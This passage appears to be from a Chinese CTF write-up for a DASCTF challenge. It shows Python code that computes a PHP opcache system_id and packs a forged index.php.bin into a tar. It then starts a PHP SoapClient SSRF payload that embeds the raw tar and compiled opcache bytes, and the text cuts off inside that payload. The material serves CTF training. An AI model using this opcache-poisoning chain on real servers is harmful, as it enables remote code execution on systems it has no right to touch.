+<p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118001157576.png" srcset="/img/loading.gif" lazyload alt="image-20240118001157576"></p>
+<h3 id="获取system-id"><a href="#获取system-id" class="headerlink" title="获取system_id"></a>获取system_id</h3><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118001731562.png" srcset="/img/loading.gif" lazyload alt="image-20240118001731562"></p>
+<p>这两个信息算出<code>system_id</code></p>
+<p>算出system_id,创建tar目录文件,&#x2F;tmp目录下路径为<code>/system_id/var/www/html/index.php.bin</code></p>
+<div class="code-wrapper"><pre><code class="hljs Python">sys_id = hashlib.md5(<span class="hljs-string">&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\002&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()
+<span class="hljs-built_in">print</span>(sys_id)
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">tar_file</span>():
+    tar_filename = <span class="hljs-string">&#x27;exp.tar&#x27;</span>
+    <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(tar_filename,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> tar:
+        directory_info = tarfile.TarInfo(name=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;sys_id&#125;</span>/var/www/html&#x27;</span>)
+        directory_info.<span class="hljs-built_in">type</span> = tarfile.DIRTYPE
+        directory_info.mode = <span class="hljs-number">0o777</span>
+
+        tar.addfile(directory_info)
+
+        tar.add(<span class="hljs-string">&#x27;index.php.bin&#x27;</span>, arcname=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;sys_id&#125;</span>/var/www/html/index.php.bin&#x27;</span>)</code></pre></div>
+
+<p>接着获取SSRF的数据</p>
+<div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():
+    file = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;exp.tar&quot;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;exp.tar&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read(),<span class="hljs-string">&quot;application/x-tar&quot;</span>)&#125;
+    res  = requests.post(url=url,files=file)
+    <span class="hljs-built_in">print</span>(res.request.headers)
+    <span class="hljs-keyword">return</span> res.request
+request_content = upload()
+upload_body = <span class="hljs-built_in">str</span>(request_content.body).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)
+content_length = request_content.headers[<span class="hljs-string">&#x27;Content-Length&#x27;</span>]
+<span class="hljs-built_in">print</span>(content_length)
+<span class="hljs-built_in">print</span>(upload_body)</code></pre></div>
+
+<p><code>index.php</code>可以调用任意无参方法,那么可以通过<code>SoapClient</code>的<code>__call</code>去SSRF,但是涉及到压缩包文件上传的报文伪造,处理起来比较麻烦,这里出题人就选择通过python去获取文件上传的数据,比较难看.</p>
+<p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118002154318.png" srcset="/img/loading.gif" lazyload alt="image-20240118002154318"></p>
+<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">siroha</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$koi</span>;
+
+
+&#125;
+<span class="hljs-variable">$postdata</span> = <span class="hljs-string">&quot;--0f9486e921f5468f9ab50745c4c93267\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;exp.tar\&quot;\r\nContent-Type: application/x-tar\r\n\r\n214510e772fba140ea7a33a277f2799e/var/www/html/\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000777\x000000000\x000000000\x0000000000000\x0000000000000\x00014543\x00 5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00././@PaxHeader\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000000\x000000000\x000000000\x0000000000034\x0000000000000\x00010212\x00 x\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0028 mtime=1696745575.7742124\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00214510e772fba140ea7a33a277f2799e/var/www/html/index.php.bin\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000666\x000000000\x000000000\x0000000001700\x0014510444150\x00017165\x00 0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00OPCACHE\x00214510e772fba140ea7a33a277f2799ep\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa9\xf9 e\x00\x00\x00\x00\x07]1\xcd    \xd8\x01\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00badm\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00ibu.\xb0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00@\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80F\&quot;e\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00#olh\x99F\&quot;e\x00\x00\x00\x00\x02\x00\x00\x00V\x00\x00\x00\xb2$\x83\xaf\xdd\xaa\xdf\x8c\x17\x00\x00\x00\x00\x00\x00\x00/var/www/html/index.php\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\&quot;@\xb0\xc5\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x90\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00V\x00\x00\x00\xf9\xe0\xf8\xab\xb5\xd0\x00\x80\x07\x00\x00\x00\x00\x00\x00\x00phpinfo\x00\x02\x00\x00\x00V\x00\x00\x00jQ\xe3\x0e1\x00\x00\x80\x05\x00\x00\x00\x00\x00\x00\x00_POST\x00\x00\x00E\x05\x00\x00\x00\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00=\x00\x01\x00\x8b\x08\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x02\x00\x00\x00\x81\x00\x00\x007\x06\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xff\xff\xff\xff`\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00P\x01\x00\x02A\x06\x00\x00\x00\x00\x00\x00`\x00\x00\x00\x02\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00Q\x02\x01\x02\xf1\x05\x00\x00\x00\x00\x00\x00P\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x01\x00\x00\x00\x03\x00\x00\x00I\x02\x00\x00F\x05\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x03\x00\x00\x00&gt;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0